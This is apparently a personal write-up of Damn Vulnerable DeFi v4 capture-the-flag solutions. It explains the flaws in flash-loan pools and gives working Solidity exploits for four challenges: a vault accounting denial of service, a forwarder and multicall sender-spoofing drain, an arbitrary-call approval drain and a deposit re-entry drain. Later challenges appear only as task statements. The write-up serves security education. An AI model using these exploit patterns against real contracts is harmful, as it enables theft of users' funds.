# Damn Vulnerable DeFi v4
## Preface
Location: [https://www.damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz)

This is for my personal use to ensure that I understand what I'm doing. Some of the solution code was inspired, analyzed and rewritten, or partially copied from other solutions. While I attempted to do as much as possible on my own, I took peeks here and there when I got stuck.

Here are some sources that I've used while doing this CTF:

* https://medium.com/@opensiddhu993/
* https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a


## 1. Unstoppable
```
There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.
```

Denial of service (DoS) is a much broader category than other vulnerabilities this CTF explores. For example, rescuing funds can be seen as DoS. Specifically, we're looking for ways to prevent _others_ from correct execution of the contract: you can always find a way to screw up your own transaction. Looking at the `UnstoppableVault.flashLoan` function, we can see that it has three immediate conditions.

```solidity
    if (amount == 0) revert InvalidAmount(0); // fail early
    if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement

    uint256 balanceBefore = totalAssets();
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

The first two are direct checks on our inputs, so they're irrelevant. The third, however, affects the contract itself. If we can find a way to make `convertToShares(totalSupply) != balanceBefore`, it will prevent anyone from using `flashLoan`. The `balanceBefore` variable is calulated by calling `totalAssets`, defined as below.

```solidity
    function totalAssets() public view override nonReadReentrant returns (uint256) {
        return asset.balanceOf(address(this));
    }
```
This calculates the total assets by checking the balance of `DamnValuableToken` (DVT) assigned to the vault. You may notice that neither `totalSupply` nor `convertToShares` is defined in this class. `convertToShares` is actually defined in ERC4626 and `totalSupply` is defined in ERC20. If we peruse through OpenZeppelin's (OZ) "ERC20.sol", we can see that it's backed by an internal accounting variable that is only changed when `ERC20._update` is called.

```solidity
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }
```

Since `asset.balanceOf(address(this))` needs to be one-to-one with `convertToShares(totalSupply)`, then updating the DVT balance outside of the internal accounting will cause this requirement to fail.

The exploit is simply transfering some DVT from `player` to `vault`.
```solidity
    token.transfer(payable(address(vault)), 10e18);
```

## 2. Naive receiver
```
There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
```

This one's instantly a big step up in difficulty from challenge 1. Let's start with some background information. A flash loan allows contracts to take out a loan and pay it back within the _same_ function. If you don't pay it back, the lender will revert your transaction. The "meta-transactions" they're talking about is the `BasicForwarder` contract. I don't know why they don't just call it a relay, but that's basically all it does. The relay requires that the address at `Request.from` signed the request, so causing a mismatch there isn't a vector.

We also need to take into account a few other facts. We don't have any ETH in the `player` account, but `receiver` does. The `flashLoan` function allows you to call it for any `IERC3156FlashBorrower` and the `FlashLoanReceiver` contract at `receiver` doesn't check to see if it actually wanted the loan. The `NaiveReceiverPool` inherits from `Multicall`, exposing the `Multicall.multicall` function. This allows a single transaction to contain several calls to the same contract.

Alright, meat and potatoes. Note that `flashLoan` deposits the loan fee in `feeReceiver`'s account.

```solidity
    deposits[feeReceiver] += FIXED_FEE;
```

Also note that `withdraw` is using a function called `_msgSender` to determine which account to pull from.

```solidity
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
```

Because `withdraw` is dependent on the transaction's sender, it has special handling for messages from the forwarder to parse out the real address.

```solidity
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```

Going back a step, we see that `BasicForwarder.execute` packs the `BasicForwarder.Request`'s `data` and `from` fields into the `msg.data` it sends.

```solidity
        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;

        bytes memory payload = abi.encodePacked(request.data, request.from); // **DANI: Payload built here**

        uint256 forwardGas = request.gas;
        assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }
```

We control both `data` and `from`, but `from` is strictly constrained because we would need access to the private key to sign for someone else. `data` is a free variable, so maybe we could construct it in such a way that `_msgSender` returns the address of `feeReceiver`. (Un)fortunately, `_msgSender` takes this into account by always selecting the last 20 bytes which matches the `from` field instead. We're missing a piece of the puzzle: `Multicall`.


```solidity
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]); // **DANI: Note `data` getting passed in!**
        }
        return results;
    }
```

`Multicall` uses OZ's `functionDelegateCall` which wraps `address.delegatecall`. This function keeps the `sender` and `value` fields the same but overwrites the transaction's `data` field. We can use this disjoint between `multicall` and `_msgSender` to withdraw from `feeReceiver`'s account!

Exploit time. We build a `Request` we send to `BasicForwarder.execute` that we want relayed to `NaiveReceiverPool.multicall`. The argument `bytes[] calldata data` we send will 11 total calls: 10 to `flashLoan` and 1 to `withdraw`. The `flashLoan` calls will use the `receiver`'s account so they have to pay the 1 WETH fee, thus depositing all their WETH into `feeReceiver`'s account. For the `withdraw` call, we'll append the `feeReceiver`'s address to the end like `BasicForwarder` would.

```solidity
    function test_naiveReceiver() public checkSolvedByPlayer {
        /**
         * 1. Create 10 packed calls to flashloan with the receiver to drain the accounts (abi.encodeCall)
         * 2. Make a final packed call to withdraw from deployer (abi.encodePacked)
         * 3. Encode all of that with a multicall encodeCall
         * 4. Create a Forwarder request with that calldata
         * 5. Pack and hash the request
         * 6. Pack the signature
         * 7. Send to forwarder
         */

        // 1.
        bytes[] memory packed_calls = new bytes[](11);

        for(uint256 i=0; i < 10; i++) {
            packed_calls[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
        }

        // 2.
        packed_calls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), bytes32(uint256(uint160(deployer))));

        // 3.
        bytes memory top_level_call = abi.encodeCall(Multicall.multicall, packed_calls);

        // 4.
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: top_level_call,
            deadline: 1 days
        });

        bytes32 req_hash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, req_hash);
        forwarder.execute(request, abi.encodePacked(r,s,v));
    }
```


## 3. Truster
```
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.
```

As we saw in challenge 1, there is a standardized way to interact with flash lenders, `IERC3156FlashBorrower`. This interface defines a strict way that the lender calls back to the borrower. In this challenge, `TrusterLenderPool` has ignored that interface and is doing it naively.


```solidity
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

The `flashLoan` function takes `borrower`, `target`, and `data` arguments that are of immediate interest. The `borrower` does not have to be the `msg.sender` nor the `target`. Which function to call and what arguments to call it with are also free variables.

The exploit is simple. Call `flashLoan` with the token as the `target` and encode `approve` as the function call. Because the assert statments in solution checker require it to be done in a single transaction, just create a contract to do the work and deploy it.

```solidity
contract Exploit {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    function beatemup(TrusterLenderPool pool, address recovery, DamnValuableToken token) external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL));
        token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
        token.transfer(recovery, TOKENS_IN_POOL);
    }

}
```


## 4. Side entrance
```
A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
```

The `SideEntranceLenderPool` is another flash loan pool with bad accounting. Take a look at the following functions, `flashLoan` and `deposit`.

```solidity
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

`flashLoan` determines whether you paid it back by comparing its _total_ account balance before and after. Meanwhile, it determines _your account's_ balance via an internal acccounting variable, `balances`. The exploit exists in the slack between the two. `deposit` is a `payable` function and uses `msg.value` directly. This means you have to pay in the basechain token, ETH. When you pay `deposit`, it adds it to the pool's balance while simultaneously adding to the accounting.

Here's the idea:
    1. Take a flash loan for everything in the pool
    2. In your `execute` function, deposit it all into your account
    3. When `flashLoan` is returned to from your function, the balances will match
    4. Withdraw everything from the pool


```solidity
contract Exploit {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool pool;
    address recip;

    constructor(SideEntranceLenderPool _pool, address _recip) {
        pool  = _pool;
        recip = _recip;
    }

    receive() external payable{}

    function win() external {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        payable(recip).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
```

## 5. The Rewarder
```
A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they’re included in the chosen set of beneficiaries. Don’t worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you’ve realized there’s a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.
```

## 6. Selfie
```
A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.
```

## 7. Compromised
```
While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:


HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35


A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0x188...088, 0xA41...9D8 and 0xab3...a40.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.
```

## 8. Puppet
```
There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.
```

## 9. Puppetv2
```
The developers of the previous pool seem to have learned the lesson. And released a new version.

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn’t that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

Save all funds from the pool, depositing them into the designated recovery account.
```

## 15. ABI Smuggling
```
There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

Rescue all funds from the vault, transferring them to the designated recovery account.
```